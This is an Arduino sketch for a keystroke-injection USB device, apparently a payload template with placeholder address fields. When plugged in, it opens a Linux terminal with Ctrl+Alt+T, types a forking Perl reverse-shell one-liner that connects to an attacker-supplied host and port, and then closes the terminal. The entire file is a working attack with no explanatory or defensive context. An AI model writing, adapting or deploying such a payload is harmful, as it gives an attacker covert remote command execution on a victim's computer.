void setup()
{
  Keyboard.begin();
}

void loop()
{
  delay(5000);
  terminal();
  delay(3000);
  Keyboard.print(F("perl -MIO -e '$p=fork;exit,if"));
  delay(100);
  Keyboard.print(F("($p);$c=new IO::Socket::INET"));
  delay(100);
  Keyboard.print(F("(PeerAddr,\"INPUT0:INPUT1\""));
  delay(100);
  Keyboard.print(F(");STDIN->fdopen($c,r);$~->"));
  delay(100);
  Keyboard.print(F("fdopen($c,w);system$_ "));
  delay(100);
  Keyboard.println(F("while<>;'"));
  delay(1000);
  Keyboard.println(F("exit"));
  while(true);
    
}

void terminal()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll(); 

}

